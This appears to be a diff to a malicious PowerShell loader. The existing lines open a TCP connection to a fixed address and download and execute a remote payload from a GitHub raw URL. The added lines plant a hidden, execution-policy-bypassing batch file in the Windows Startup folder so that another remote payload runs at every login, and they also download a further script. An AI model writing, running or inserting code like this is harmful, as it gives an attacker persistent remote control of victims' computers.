@@ -1,2 +1,6 @@
 $client = New-Object System.Net.Sockets.TCPClient('192.168.0.122',553);
+cd '~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
+New-Item start.bat
+Set-Content start.bat 'powershell  -w hidden -Exec ByPass -NoProfile -c (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay3.txt') | IEX'
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/keep.ps1" -OutFile keep.ps1
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay2.txt');
